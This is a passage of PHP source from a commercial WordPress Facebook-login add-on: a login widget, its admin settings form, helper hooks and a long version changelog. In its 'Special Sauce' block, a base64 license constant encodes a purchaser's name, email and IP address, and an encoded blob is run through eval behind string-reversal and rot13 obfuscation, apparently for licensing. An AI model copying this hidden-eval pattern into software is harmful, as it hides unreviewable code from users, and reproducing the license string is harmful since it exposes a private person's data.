                            		window.location = "<?php echo html_entity_decode(wp_logout_url( $_SERVER['REQUEST_URI'] )); ?>";
                        	}
                        	else
                        		window.location = "<?php echo html_entity_decode(wp_logout_url( $_SERVER['REQUEST_URI'] )); ?>";
                        });
                    }
                  //--></script>
                <?php else: ?>
					<a href="<?php echo wp_logout_url( $_SERVER['REQUEST_URI'] )?>"><?php echo $instance['labelLogout']; ?></a>
			    <?php endif; ?>
              </small>
            </div>
        <?php
        
        //If not logged in, show the login form:
        else:
            //Wordpress "User/Pass" fields 
            if( $instance['showwplogin'] ):
            ?>
            <form name='loginform' id='loginform' action='<?php echo wp_login_url(); ?>' method='post'>
                <label><?php echo $instance['labelUserName']; ?></label><br />
                <input type='text' name='log' id='user_login' class='input' tabindex='20' /><input type='submit' name='wp-submit' id='wp-submit' value='<?php echo $instance['labelBtn']; ?>' tabindex='23' /><br />
                <label><?php echo $instance['labelPass']; ?></label><br />
                <input type='password' name='pwd' id='user_pass' class='input' tabindex='21' />
                <span id="forgotText"><?php if( $instance['showforgot'] ): ?> <a href="<?php echo (isset($instance['forgotURL'])?$instance['forgotURL']:wp_lostpassword_url());?>" rel="nofollow" ><?php echo $instance['labelForgot']; ?></a><?php else: echo "&nbsp;"; endif; ?></span><br />
                <?php 
                if( $instance['showrememberme'] )
                    echo '<input name="rememberme" type="checkbox" id="rememberme" value="forever" tabindex="90" /> ' . $instance['labelRemember'];
                ?>
                <?php if( $instance['showregister'] ) echo wp_register('',''); ?>
                <input type='hidden' name='redirect_to' value='<?php echo htmlspecialchars($_SERVER['REQUEST_URI'])?>' />
            </form>
            <?php
            
            //Note that if we AREN'T showing the user/pass fields but the user DOES want a "rememberme" checkbox,
            //we'll create a "dummy" form with just that checkbox.  The value will be fetched via JS later, when
            //the user actually performs the login (see jfb_p_rememberme_frm/jfb_p_rememberme_js below).
            elseif ($instance['showrememberme']):
                echo '<input name="rememberme" type="checkbox" id="rememberme" value="forever" tabindex="90" /> ' . $instance['labelRemember'];
            endif;
            
            //Now we can output the Facebook button
            global $opt_jfb_hide_button;
            if( !get_option($opt_jfb_hide_button) )
            {
                jfb_output_facebook_btn();
            }
        endif;
        echo $after_widget;
    }

    //Update the widget settings
    function update( $new_instance, $old_instance )
    {
        $instance = $old_instance;
        $instance['title'] = $new_instance['title'];
        $instance['labelUserName'] = $new_instance['labelUserName'];
        $instance['labelPass'] = $new_instance['labelPass'];
        $instance['labelRemember'] = $new_instance['labelRemember'];
        $instance['labelForgot'] = $new_instance['labelForgot'];
        $instance['labelBtn'] = $new_instance['labelBtn'];
        $instance['labelLogout'] = $new_instance['labelLogout'];
        $instance['labelProfile'] = $new_instance['labelProfile'];
        $instance['labelWelcome'] = $new_instance['labelWelcome'];
        $instance['showwplogin'] = $new_instance['showwplogin'] ? 1 : 0;
        $instance['showrememberme'] = $new_instance['showrememberme'] ? 1 : 0;
        $instance['showregister'] = $new_instance['showregister'] ? 1 : 0;
        $instance['showforgot'] = $new_instance['showforgot'] ? 1 : 0;
        $instance['logoutofFB'] = $new_instance['logoutofFB'] ? 1 : 0;
        $instance['showavatar'] = $new_instance['showavatar'] ? 1 : 0;
        $instance['showEditProfile'] = $new_instance['showEditProfile'] ? 1 : 0;
        $instance['bpProfileLink'] = $new_instance['bpProfileLink'] ? 1 : 0;
        $instance['avatarsize'] = $new_instance['avatarsize'];
        $instance['forgotURL'] = $new_instance['forgotURL'];
        return $instance;
    }

    //Display the widget settings on the widgets admin panel
    function form( $instance )
    {
        $default = array( "title"=>"WP-FB AutoConnect",
                          "labelUserName"=>"User:", "labelPass"=>"Pass:", "labelBtn"=>"Login", "labelRemember"=>"Remember", "labelForgot"=>"Forgot?", "labelLogout"=>"Logout", "labelProfile"=>"Edit Profile", "labelWelcome"=>"Welcome,", 
                          "showwplogin"=>true, "showrememberme"=>false, "showregister"=>true, "showforgot"=>true, "logoutofFB"=>false, "showavatar"=>false, "showEditProfile"=>true, "bpProfileLink"=>true, "avatarsize"=>35,
                          "forgotURL"=>wp_lostpassword_url());
		$instance = wp_parse_args( (array) $instance, $default );
        ?>
        <p>
            <b><?php echo 'Title:'; ?></b>
            <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $instance['title']; ?>" />
        </p>
        <p>
            <b><?php echo 'Labels:'; ?></b><br />
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelUserName'); ?>" name="<?php echo $this->get_field_name('labelUserName'); ?>" type="text" value="<?php echo $instance['labelUserName']; ?>" /> <small>User</small><br />
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelPass'); ?>" name="<?php echo $this->get_field_name('labelPass'); ?>" type="text" value="<?php echo $instance['labelPass']; ?>" /> <small>Pass</small><br />
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelBtn'); ?>" name="<?php echo $this->get_field_name('labelBtn'); ?>" type="text" value="<?php echo $instance['labelBtn']; ?>" /> <small>Login</small>
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelRemember'); ?>" name="<?php echo $this->get_field_name('labelRemember'); ?>" type="text" value="<?php echo $instance['labelRemember']; ?>" /> <small>Remember</small>
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelForgot'); ?>" name="<?php echo $this->get_field_name('labelForgot'); ?>" type="text" value="<?php echo $instance['labelForgot']; ?>" /> <small>Forgot?</small>
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelLogout'); ?>" name="<?php echo $this->get_field_name('labelLogout'); ?>" type="text" value="<?php echo $instance['labelLogout']; ?>" /> <small>Logout</small>
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelProfile'); ?>" name="<?php echo $this->get_field_name('labelProfile'); ?>" type="text" value="<?php echo $instance['labelProfile']; ?>" /> <small>Edit Profile</small>
            <input style="width:50%;" id="<?php echo $this->get_field_id('labelWelcome'); ?>" name="<?php echo $this->get_field_name('labelWelcome'); ?>" type="text" value="<?php echo $instance['labelWelcome']; ?>" /> <small>Welcome,</small>
        </p>
        
        <p>
            <b><?php echo 'Other:'; ?></b><br />
            <input class="checkbox" type="checkbox" <?php checked( $instance['logoutofFB'], true ); ?> id="<?php echo $this->get_field_id( 'logoutofFB' ); ?>" name="<?php echo $this->get_field_name( 'logoutofFB' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'logoutofFB' ); ?>"><?php echo "Logout logs out of Facebook too" ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['showwplogin'], true ); ?> id="<?php echo $this->get_field_id( 'showwplogin' ); ?>" name="<?php echo $this->get_field_name( 'showwplogin' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showwplogin' ); ?>"><?php echo 'Show WP User/Pass Login' ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['showrememberme'], true ); ?> id="<?php echo $this->get_field_id( 'showrememberme' ); ?>" name="<?php echo $this->get_field_name( 'showrememberme' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showrememberme' ); ?>"><?php echo "Show 'Remember'" ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['showregister'], true ); ?> id="<?php echo $this->get_field_id( 'showregister' ); ?>" name="<?php echo $this->get_field_name( 'showregister' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showregister' ); ?>"><?php echo "Show 'Register'" ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['showforgot'], true ); ?> id="<?php echo $this->get_field_id( 'showforgot' ); ?>" name="<?php echo $this->get_field_name( 'showforgot' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showforgot' ); ?>"><?php echo "Show 'Forgot?'" ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['showEditProfile'], true ); ?> id="<?php echo $this->get_field_id( 'showEditProfile' ); ?>" name="<?php echo $this->get_field_name( 'showEditProfile' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showEditProfile' ); ?>"><?php echo "Show 'Edit Profile'" ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['bpProfileLink'], true ); ?> id="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>" name="<?php echo $this->get_field_name( 'bpProfileLink' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'bpProfileLink' ); ?>"><?php echo "Edit profile links to BP (if available)" ?></label><br />
            
            <input class="checkbox" type="checkbox" <?php checked( $instance['showavatar'], true ); ?> id="<?php echo $this->get_field_id( 'showavatar' ); ?>" name="<?php echo $this->get_field_name( 'showavatar' ); ?>" />
            <label for="<?php echo $this->get_field_id( 'showavatar' ); ?>"><?php echo "Show Avatar (when logged in)" ?></label><br />
            
    		Avatar Size: <input style="width:35px" id="<?php echo $this->get_field_id('avatarsize'); ?>" name="<?php echo $this->get_field_name('avatarsize'); ?>" type="text" value="<?php echo $instance['avatarsize']; ?>" />px<br/>
    		
    		Forgot Pass URL:<br/>
    		<input style="width:100%" id="<?php echo $this->get_field_id('forgotURL'); ?>" name="<?php echo $this->get_field_name('forgotURL'); ?>" type="text" value="<?php echo $instance['forgotURL']; ?>" />
        </p>
<?php }
}


//Add a POST variable to be sent through to _process_login.php
add_action('wpfb_add_to_form', 'jfb_p_rememberme_frm');
function jfb_p_rememberme_frm(){
  echo '<input type="hidden" name="rememberme" id="fb_rememberme" value="0" />';
}

//Before the form is submitted, use JS to set the field dynamically from a textbox
add_action('wpfb_add_to_js', 'jfb_p_rememberme_js');
function jfb_p_rememberme_js(){
  echo "var rememberme = document.getElementById('rememberme');\n";
  echo "if( rememberme && rememberme.checked ) document.getElementById('fb_rememberme').value = 1;\n";
}



/**********************************************************************/
/**********************************************************************/
/***************************Special Sauce******************************/
/**********************************************************************/
/**********************************************************************/

define('JFB_PREMIUM_VALUE', 'YToxMDp7czo0OiJ1c2VyIjtpOjQxNzU7czo1OiJlbWFpbCI7czoxNzoidG9ybWluZUBnbWFpbC5jb20iO3M6NDoibmFtZSI7czoxMzoiSmVycnkgTmljb2xhcyI7czo3OiJ2ZXJzaW9uIjtzOjM6IiAzMyI7czo1OiJvcmRlciI7aTo0NTAyO3M6NzoidXBncmFkZSI7czoxOiIwIjtzOjc6InByb2R1Y3QiO2k6NDk7czo1OiJwcmljZSI7czo1OiIyOS45OSI7czo0OiJkYXRlIjtzOjE5OiIyMDE0LTA0LTAyIDEwOjE4OjA1IjtzOjI6IklQIjtzOjE0OiI2Mi4xNzguMjExLjEwNSI7fQ==');
$CWBXLP='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';$ecnbav=';)))CYKOJP$(rqbprq_46rfno(rgnysavmt(ynir';$TMwJOe=strrev($ecnbav);$cDrWsZ=str_rot13($TMwJOe);eval($cDrWsZ);



/**********************************************************************/
/**********************************************************************/
/******************************CHANGELOG*******************************/
/**********************************************************************/
/**********************************************************************/

/*
 * Changelog:
 * v33 (01/10/2014):
 * -New Feature: Shortcode support. [jfb_facebook_btn] can now be used to add Facebook login buttons to posts and pages.
 * -New Feature: Allow users to manually associate their WP/BP profiles with Facebook. Useful for users who want to 
 *  be able to explicitly retain their existing blog account, even if their WP & FB e-mails might not match.
 * -New Feature: Add the "Disconnect from Facebook" button to BuddyPress XProfiles (in addition to Wordpress profiles).
 * -New Feature: Option to add a Facebook button to the BuddyPress registration page.
 * -New Feature: Widget option to specify the destination URL for the "Forgot Password" link
 * -New Feature: Widget option to hide the "Forgot?" link
 * -The "Facebook" section that this plugin adds to the WP / BP profiles is now always shown, regardless of whether the
 *  'show a disassociate button' option is enabled.  When that option is disabled, only the UID is shown (without a button). 
 * -Show the comment form login button even when the comment form is hidden (by the 'Users must be registered and logged in to comment' option)
 * -Replace all "Mouseover for more info" links with "Click for more info," so they'll be easier to read and more mobile browser-friendly.
 * -Update checker improvements:
 *   *Message header text removed from this file; it will now be fetched from the VersionCheck script, along with the rest of the message.
 *   *The manual check link now explicitly says "Check for Updates," rather than just the current version
 *   *Clearer messages are now shown when manually checking (i.e. 'no new version available,' or the new version information [instead of both])
 *   *Don't use $opt_jfbp_latestversion for the POST when checking manually - that confuses the meaning of the var.
 *   *When hiding update notifications, show a message, and don't append a var to the URL (so navigating around won't continue to set the option.)
 *   *When hiding update notifications, only hide it for this version - the notification will be shown again if another updated version is posted.
 * -Fix some warnings that appear when saving premium options with WP_DEBUG defined
 * -Other minor tweaks & cleanups 
 * -Required core version is now 3.1.3
 * 
 * v32 (08/21/2013):
 * -Use wp_login_url() and wp_lostpassword_url() instead of site_url('wp-login.php') in the widget, so that wp-login.php can be moved/renamed.
 * -Replace one old REST call in the "enforce email" option that was causing logins to fail for some users 
 * 
 * v31 (06/04/2013):
 * -Fix jfb_multisite_add_to_blog, so it uses the same default role as when autoregistering new users
 * -Minor admin panel revision, so the free plugin's teaser will show the image-based button preview
 * -Don't include my jquery.1.4.4 on wp-login.php; instead use wp_enqueue_script()
 * -Replace a couple calls to jfb_auth with jfb_auth2
 * -Remove SERVER_NAME, SERVER_ADDR, and SCRIPT_FILENAME from Auth
 * -Add the wpuid to the wpfb_xprofile_fields_received filter
 * 
 * v30 (03/07/2013): 
 * Image-Based Login Buttons (requires core 3.0.0+):
 *  -You'll finally be able to use any image you like as the login button.
 *  -Image-based buttons are fully CSS-styleable, and will not delay-load (they appear the second your page does, like any other element).
 * Better MultiSite Support:
 *  -Pass blogid into _process_login.php, and switch_to_blog() to ensure the user is added to the site from which they initiated the login.
 *  -Add a basedir option for avatar caching, so sites on a network can share the same avatar cache (requires core 2.5.11+)
 *  -Avatar files get automatically deleted when a user is deleted from the network
 * Better SSL Support:
 *  -Widget login form uses site_url (to support FORCE_SSL_LOGIN)
 *  -Explicitly change the uploaddir to https if the current page is ssl (to avoid mixed content warnings)
 * Remove dependance on the PHP API:
 *  -Redo autoregistration-by-friendship to not rely on the PHP API
 *  -Redo autoregistration-by-group to not rely on the PHP API
 *  -Redo autoregistration-by-page to not rely on the PHP API
 *  -Redo XProfile fetching to not rely on the PHP API
 * New Widget Features:
 *  -Add a new option to hide the "Register" link (only applicable if registration is enabled on the site/network)
 *  -Add a new option to hide the "Edit Profile" link
 *  -Add a new option to point the "Edit Profile" link to the BP profile (instead of WP)
 * Other:
 *  -Show simple version information if this script is accessed directly (instead of an error)
 *  -Fix a minor bug with the 'rememberme' javascript in the premium widget
 *  -Fix a bug when using the "Disconnect" button in the admin panel
 *  -Fix autoregistration-by-group to work for PRIVATE and SECRET groups (as well as public)
 *  -Fix autoregistration-by-fanpage (requires a new extended permission)
 *  -Remove reliance on wpfb_output_button (requires core 2.5.1+)
 *  -Add a keepalive & licensecheck to the updatecheck; change from twicedaily to daily (& rename the cronjob)
 *  -Better logging for avatar caching
 *  -Rearrange the admin panel a bit
 *  -Move spinner files into new "assets" dir
 *  -Other minor changes/tweaks
 * 
 * v28.5 (xx/xx/xxxx):
 * -Fix a PHP shorttag
 * -Change link to the eStore in the upgrade notification message
 * 
 * v28 (11/20/2012):
 * -The addon will now automatically check for the latest version, and display a notice if it's out-of-date.  These notices may be optionally hidden.
 * -Add the ability to import 'interests' and 'music' xprofile fields
 * -New feature: Allow administrators to disassociate Wordpress user accounts from Facebook
 * -New feature: Optionally allow users to disassociate their own accounts from Facebook
 * -New feature: Set the role for autoregistered users
 * 
 * v27 (11/11/2012):
 * -Remove the admin panel listing for "optimize for SPEED and SCALEABILITY," as this fix is now included with the free plugin
 * -Required core version is now 2.3.5
 * -Use $wpdb->base_prefix instead of hardcoding 'wp_invitations' for invitational autoregistrations
 * -Special Sauce section is now automatically obfuscated by the store
 * 
 * v26 (02/06/2012):
 * -Replace jfb_multisite_get_users() with jfb_get_candidate_users(); it's now always enabled (not just on WPMU),
 *  and executes an "optimized query" to return only candidate users with matching usermeta, drastically speeding up
 *  logins on sites with many users 
 * -Split "avatar caching" into two options, so you can enable caching of thumbnails or fullsize images only -
 *  a performance optimization for sites that don't actually need both.
 * -Added new BuddyPress feature: the ability to announce new/returning logins to the Activity Stream
 * -Added four new filters so you can supplement the provided XProfile mappings with your own, or modify the incoming data as you see fit:
 *  wpfb_xprofile_allowed_mappings, wpfb_xprofile_fields_requiring_perms, wpfb_xprofile_fields_to_query, wpfb_xprofile_fields_received. 
 * 
 * v25 (11/25/2011):
 * -Major new feature: Ability to map Facebook profile data to BuddyPress XProfile fields!
 * -Required core version is now 2.1.7
 * -Replace deprecated get_settings() calls with get_option() in the Premium widget
 * -Add "rel=nofollow" to the Lost Password link in the premium widget
 * -Minor admin panel changes to accommodate the new TABBED panel 
 * 
 * v24 (10/01/2011):
 * -Update to OAuth 2.0.  Now requires free plugin v2.1.0 or higher.
 * 
 * v23 (09/26/2011):
 * -Support "%username%" variables in custom redirect URLs
 * -Add ability to show the user's avatar in the widget (when logged in)
 * -When deleting a user, also try to delete their cached avatar file (if present)
 * -Update the instructions for finding a userid/fanpageid (facebook changed their URL structure again)
 * -Get rid of legacy API code
 * 
 * v22 (06/09/2011):
 * -Created a new premium widget, that adds several options not provided by the free one:
 *  Customize the Widget's text, Hide the WP login fields, Show a "RememberMe" checkbox, Logout of Facebook (as well as blog) 
 * -When caching avatars, only store the relative path (under the UPLOADS dir), not the full absolute path (requires core 2.0.1)
 * -Show a link to autoregistered users' Facebook profiles on "Managed Users" admin page 
 * -Replace some depreciated functions
 * -Removed ToDo list from this file
 * -Code reorganization: moved all add_action()/add_filter() to one code block
 * 
 * v21 (05/19/2011):
 * -New Graph API code is now migrated to the Free plugin; this update is REQUIRED for core plugin 2.0.0!
 * -Better error reporting if the server fails to cache avatars
 *
 * v20 (04/01/2011):
 * -Output an html comment in the "init" fxn
 * -fbLoginButton is now a class instead of an id, to fix validation with multiple buttons on one page.
 *  As a result, clicking any one button now activates the spinner on all buttons
 * -Requires core version 1.9.1
 * 
 * v19 (03/31/2011):
 * -New Feature: Conditional autoregistration based on Facebook friendships
 * -New Feature: Conditional autoregistration based on Facebook group membership
 * -New Feature: Conditional autoregistration based on Facebook fanpages
 * -New Feature: Allow localization of Facebook popups to be disabled (checkbox)
 * -Admin panel cleanups: Fix a validation issue, change <small> descriptions to 
 *  mouseover <dfn>'s, move & rephrase various items
 * -Documentation cleanups: reverse the changelog, move it to the bottom of the file,
 *  tidy up the TODO list, revise the instructions, etc.
 * -Required core plugin version increased to 1.8.7
 * 
 * v18 (03/24/2011):
 * -Add a new wpfb_extended_permissions filter
 * 
 * v17 (03/22/2011):
 * -Fix a bug with wp-login.php when using the new API
 * 
 * v16 (03/22/2011):
 * -Premium.php was renamed to WP-FB-AutoConnect.php, and should now reside *outside* the base plugin's 
 *  directory (aka in the root /wp-content/plugins dir). This is to prevent it from getting overwritten 
 *  when updating the free version of the plugin. The old "Premium.php" path will still work, but I suggest
 *  using the new filename for your own convenience.
 * -MAJOR new feature: Option to use the new (Graph) Facebook API!
 *  Note that the new API offers several advantages:
 *   ->It's compatible with IE9
 *   ->It can coexist with other official Facebook plugins (i.e. Like boxes and comment forms)
 *   ->If you prompt for extended permissions (i.e. email, publish-to-wall), all of the prompts will now 
 *     appear in a single popup. Note that this makes "request permission to get their email address" 
 *     effectively identical to "request and require permission"; since all prompts are now presented together,
 *     there will be no way for the user to accept general access but deny email access.  It's all or nothing.
 * Other important things to note:
 *   ->If you're using a caching plugin, make sure to clear your cache after toggling this option
 *   ->If you've used any of this plugin's hooks to access the Facebook API, make sure to reformat your calls
 *     to work with the new API. Hooks that provide a Facebook object are:
 *     wpfb_connect, wpfb_existing_user, wpfb_inserted_user, and wpfb_login.
 *     If you'd like to simultaneously support both API versions, you can use a check like:
 *     if( version_compare(@constant('Facebook::VERSION'), '2.1.2', ">=") ) {}//new version
 *     else																	{}//old version
 *   ->As this is a very new feature, it should be considered as "beta."  If you experience any severe/breaking
 *     issues, you can always choose to use the old API and the plugin should function as it did previously.
 *     Note that it's also possible that using the new API will cause incompatibilities with older Facebook 
 *     plugins which still rely on the old API.
 *     
 * v15 (03/17/2011):
 * -Remove the "option" to handle double-logins; it's always automatically handled now.
 * 
 * v14 (03/17/2011):
 * -Don't show the button on wp-signup.php when signups are disabled
 * -Add some css to align the button on wp-signup.php more nicely
 *
 * v13 (03/17/2011):
 * -Change: Rearranged the admin panel
 * -Feature: Under the "Additional Buttons" section, you can now add a button to wp-signup.php (WPMU only)
 * -Feature: Wordbooker Avatar integration
 * -Fix: Cached avatars will now always go into the specified directory, regardless of the 
 *       "Organize my uploads into month- and year-based folders" setting
 * -Fix: Corrected a bug with roles for autogenerated users on MultiSite/WPMU
 * -Fix: Always enqueue jQuery when the AJAX spinner option is enabled (for themes that don't do so by default)
 *
 * v12 (01/29/2011):
 * -Output a comment showing the premium version (for debugging)
 *
 * v11 (01/28/2011):
 * -If a language code is detected in wp-config.php, the Facebook prompts will be localized.
 * -Specify your own path to cached Facebook avatars
 * -Add a log message that this is a premium login
 * -Required core plugin version increased to 1.6.5.
 * 
 * v10 (01/28/2011):
 * -Add option to show an AJAX spinner after the Login button is clicked
 * -Add option for a custom logout url
 * -Add option to insert a Facebook button to the Registration page
 * -Better error checking for avatar caching
 * -Required core plugin version increased to 1.6.4
 * 
 * v9 (01/23/2011):
 * -Slight revisions to jfb_output_premium_panel() to let me copy it to AdminPage.php
 * -Don't override $jfb_version
 *
 * v8 (11/25/2010):
 * -Add a message about the minimum required core plugin version
 * -Rearrange & rephrase the admin panel a bit
 * -Begin work on option to collapse all the facebook prompts into one (unfinished, so option hidden)
 * -Code cleanups
 *
 * v7 (11/25/2010):
 * -Conditional Invitations: tie in with wp-secure-invites plugin
 * 
 * v6 (11/24/2010):
 * -Fix minor logging bug (wasn't correctly showing notified user's emails)
 * -New Option: Custom redirect url for autoregistered users
 * -New Option: Custom redirect url for returning users
 * -New Option: Autoregistration restriction (to disallow autoregistrations)
 * 
 * v5 (11/24/2010):
 * -Add wpmu support
 * 
 * v4 (11/02/2010):
 * -Fixed auth
 * 
 * v3 (11/02/2010): 
 * -Add this changelog 
 * -Add support for choosing button size
 * -Add support for choosing button text
 * -Add support for silently handling double-logins
 * -Add ability to ENFORCE that real emails are revealed (reject proxied emails)
 *
 * v2 (11/01/2010): 
 * -Better integration with core
 * -Premium updates now independent of core updates
 * -Requires core plugin 1.5.1 or later
 *
 * v1 (11/01/2010): 
 * -Initial Release
 */


?>